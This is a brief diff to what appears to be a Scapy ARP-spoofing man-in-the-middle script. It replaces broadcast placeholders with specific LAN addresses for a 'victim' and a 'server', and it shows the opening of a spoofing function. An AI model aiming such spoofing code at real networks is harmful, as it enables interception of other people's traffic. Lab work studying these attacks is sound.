@@ -9,10 +9,10 @@ macAttacker = get_if_hwaddr(interface)
 ipAttacker = get_if_addr(interface)
 
 macVictim = "ff:ff:ff:ff:ff:ff"
-ipVictim = "255.255.255.255"
+ipVictim = "192.168.178.144"
 
 macServer = "ff:ff:ff:ff:ff:ff"
-ipServer = "255.255.255.255"
+ipServer = "192.168.178.1"
 
 def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
